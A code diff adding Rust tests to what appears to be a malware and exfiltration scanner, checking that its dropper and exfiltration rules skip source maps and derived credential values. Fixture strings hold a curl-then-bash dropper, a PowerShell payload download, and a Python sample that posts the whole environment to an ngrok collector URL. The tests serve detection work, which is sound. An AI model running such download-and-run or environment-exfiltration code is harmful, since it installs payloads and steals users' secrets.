@@ -3551,6 +3551,90 @@ mod reconcile {
         );
     }
 
+    /// A one-line source map, as a bundler writes it: every original file is
+    /// one JSON string in `sourcesContent`.
+    fn source_map(sources: &[(&str, &str)]) -> String {
+        serde_json::json!({
+            "version": 3,
+            "file": "cli.js",
+            "sources": sources.iter().map(|(name, _)| *name).collect::<Vec<_>>(),
+            "sourcesContent": sources.iter().map(|(_, src)| *src).collect::<Vec<_>>(),
+            "names": [],
+            "mappings": "AAAA,SAAS;AACA",
+        })
+        .to_string()
+    }
+
+    /// The false High on two clean registry MCP servers (com.vibgrate/
+    /// ai-context `dist/cli.js.map`, dev.jasonpearson/auto-mobile
+    /// `dist/src/index.js.map`): a `curl … https://` in one function's help
+    /// text and an unrelated `execFileSync(<path>, …)` far below it are both
+    /// on line 1 of the map, and a same-line link needs no name.
+    fn cli_source() -> String {
+        let mut src = String::from(
+            "import { execFileSync } from 'child_process';\n\
+             export const HELP = 'Install the CLI: curl -fsSL https://example.com/install.sh | sh';\n",
+        );
+        for i in 0..150 {
+            src.push_str(&format!("export const k{i} = {i};\n"));
+        }
+        src.push_str(
+            "export function devices(adbPath: string) {\n  return execFileSync(adbPath, ['devices']).toString();\n}\n",
+        );
+        src
+    }
+
+    #[test]
+    fn a_source_map_is_not_a_dropper() {
+        let src = cli_source();
+        let map = source_map(&[("../src/cli.ts", &src)]);
+        assert_eq!(map.lines().count(), 1);
+        // Both ends still fire in the map as line observations.
+        assert!(fires("dist/cli.js.map", &map, "NET-012"));
+        assert!(fires("dist/cli.js.map", &map, "CODE-RUNFILE-001"));
+        assert_eq!(chained("dist/cli.js.map", &map, "DROPPER-CHAIN-001"), None);
+        // In the original source, 150 lines apart and sharing no name, they
+        // were never a chain.
+        assert!(fires("src/cli.ts", &src, "CODE-RUNFILE-001"));
+        assert_eq!(chained("src/cli.ts", &src, "DROPPER-CHAIN-001"), None);
+        // A map of a real download-and-run is not reported either: nothing
+        // in a source map runs. The compiled file it describes is scanned on
+        // its own, and there the dropper is the chain.
+        let dropper = "#!/bin/bash\n\
+            curl -fsSL \"https://get.example.net/i.sh\" -o \"$INSTALLER\"\n\
+            bash \"$INSTALLER\"\n";
+        let dropper_map = source_map(&[("../src/install.sh", dropper)]);
+        assert!(chains("dist/install.sh.map", &dropper_map).is_empty());
+        assert_eq!(
+            chained("dist/install.sh", dropper, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+    }
+
+    /// A file that only borrows the extension can still be run (`node
+    /// lib/x.map`, `python3 x.map`), so it is correlated like any other.
+    #[test]
+    fn a_dropper_named_like_a_source_map_is_still_a_chain() {
+        let dropper = "#!/bin/bash\n\
+            curl -fsSL \"https://get.example.net/i.sh\" -o \"$INSTALLER\"\n\
+            bash \"$INSTALLER\"\n";
+        assert_eq!(
+            chained("lib/x.map", dropper, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+        // A real map on the first line and the dropper after it: not JSON as
+        // a whole, so not a source map.
+        let smuggled = format!(
+            "{}\n{}",
+            source_map(&[("../src/cli.ts", &cli_source())]),
+            GUARDRAILS
+        );
+        assert_eq!(
+            chained("lib/x.map", &smuggled, "DROPPER-CHAIN-001"),
+            Some(Severity::High)
+        );
+    }
+
     /// A login helper that opens a credential file for *writing* and then
     /// calls the auth endpoint writes the response into the file: the data
     /// flows network → file. Binding the write handle made this an
@@ -3612,6 +3696,134 @@ mod reconcile {
             "Invoke-WebRequest -Uri https://example.net/payload.exe -OutFile $env:TEMP\\p.exe",
             "NET-EXE-001"
         ));
+    }
+
+    // -- names as values (`name_uses: value`) ------------------------------
+
+    /// A clean health check was reported CRITICAL RISK: `url` is bound from
+    /// the database URL, and the request two lines down passes a keyword
+    /// argument that is only *called* `url`.
+    #[test]
+    fn a_keyword_argument_that_repeats_a_bound_name_is_not_a_link() {
+        let src = "import os\n\
+            import requests\n\
+            url = os.environ[\"DATABASE_URL\"]\n\
+            base = \"https://status.example.com\"\n\
+            resp = requests.get(url=base + \"/ping\", timeout=5)\n";
+        assert!(scan("health.py", src)
+            .iter()
+            .any(|f| f.rule.starts_with("CRED-") && f.line == Some(3)));
+        assert!(fires("health.py", src, "NET-001"));
+        assert_eq!(chained("health.py", src, "EXFIL-CHAIN-001"), None);
+        // Sending the bound value itself is still the chain.
+        let sent = src.replace("url=base + \"/ping\"", "base, data=url");
+        assert_eq!(
+            chained("health.py", &sent, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+    }
+
+    /// artifact-lab-3-package (every version in the Datadog set,
+    /// artifact_lab_leak.py or setup.py) sends the environment in two hops:
+    /// the copy is bound to `data`, encoded into `encoded_data`, and the
+    /// request passes that as `data=encoded_data`. Correlation links one hop,
+    /// so this is not a chain; it linked only while a keyword argument's name
+    /// counted as a use (the same code with the copy called `env` never
+    /// linked). The samples keep NET-007 and INSTALL-001 at Critical; an
+    /// ordinary host in place of the tunnel URL drops the file to LOW RISK.
+    /// This is the measured cost of reading names as values.
+    #[test]
+    fn exfil_chain_does_not_follow_a_two_hop_flow() {
+        let leak = "import os\n\
+            import urllib.request\n\
+            import urllib.parse\n\
+            \n\
+            def run_payload():\n\
+            \x20   data = dict(os.environ)\n\
+            \x20   encoded_data = urllib.parse.urlencode(data).encode('utf-8')\n\
+            \x20   url = 'https://collector-7f3a.ngrok.app/collect'\n\
+            \x20   req = urllib.request.Request(url, data=encoded_data)\n\
+            \x20   urllib.request.urlopen(req)\n";
+        assert!(fires("leak.py", leak, "CRED-ENV-001"));
+        assert!(fires("leak.py", leak, "NET-007"));
+        assert_eq!(chained("leak.py", leak, "EXFIL-CHAIN-001"), None);
+        // One hop is the chain: the copy itself as the payload.
+        let one_hop = leak.replace(
+            "data=encoded_data",
+            "data=urllib.parse.urlencode(data).encode()",
+        );
+        assert_eq!(
+            chained("leak.py", &one_hop, "EXFIL-CHAIN-001"),
+            Some(Severity::Critical)
+        );
+    }
+
+    /// One propagation step (a line between source and sink that assigns an
+    /// expression using the bound name makes the new name a source too) was
+    /// measured and not adopted; see docs/detection/correlation-names.md.
+    /// These are clean shapes it reported CRITICAL RISK: an object built
+    /// from the credential whose attribute or method the request uses, and
+    /// a one-way or partial form of the secret sent where it is meant to go.
+    /// A value derived from a credential is not the credential, and one text
+    /// step cannot tell which derivations keep the secret.
+    #[test]
+    fn a_value_derived_from_a_credential_does_not_link() {
+        for (name, src) in [
+            (
+                "client.py",
+                "import os\nimport requests\n\
+                 token = os.environ[\"ACME_TOKEN\"]\n\
+                 client = Client(token)\n\
+                 STATUS_URL = \"https://status.example.com/report\"\n\
+                 requests.post(STATUS_URL, json={\"status\": client.status})\n",
+            ),
+            (
+                "engine.py",
+                "import os\nimport requests\n\
+                 url = os.environ[\"DATABASE_URL\"]\n\
+                 engine = create_engine(url, pool_pre_ping=True)\n\
+                 resp = requests.get(\"https://api.example.com/v1/health\", timeout=5)\n\
+                 with engine.connect() as conn:\n\
+                 \x20   conn.execute(text(\"select 1\"))\n",
+            ),
+            (
+                "client.js",
+                "const apiKey = process.env.OPENAI_API_KEY;\n\
+                 const openai = new OpenAI({ apiKey });\n\
+                 const res = await fetch(\"https://telemetry.example.com/v1/event\", {\n\
+                 \x20 method: \"POST\",\n\
+                 \x20 body: JSON.stringify({ model: openai.baseURL }),\n\
+                 });\n",
+            ),
+            (
+                "hook.py",
+                "import os\nimport requests\n\
+                 secret = os.environ[\"WEBHOOK_SECRET\"]\n\
+                 payload = json.dumps({\"event\": \"build.finished\"})\n\
+                 signature = hmac.new(secret.encode(), payload.encode(), hashlib.sha256).hexdigest()\n\
+                 requests.post(\"https://ci.example.com/hooks/build\", json={\"payload\": payload, \"signature\": signature})\n",
+            ),
+            (
+                "audit.py",
+                "import os\nimport requests\n\
+                 key = os.environ[\"ACME_API_KEY\"]\n\
+                 hint = key[:4] + \"****\"\n\
+                 requests.post(\"https://audit.example.com/v1/events\", json={\"key_hint\": hint})\n",
+            ),
+        ] {
+            let findings = scan(name, src);
+            assert!(
+                findings.iter().any(|f| f.rule.starts_with("CRED-")),
+                "{name}: no source"
+            );
+            assert!(
+                findings
+                    .iter()
+                    .any(|f| f.rule == "NET-001" || f.rule == "NET-004"),
+                "{name}: no sink"
+            );
+            assert_eq!(chained(name, src, "EXFIL-CHAIN-001"), None, "{name}");
+        }
     }
 
     // -- bundled pickle deserialized (DESER-CHAIN-001) ---------------------
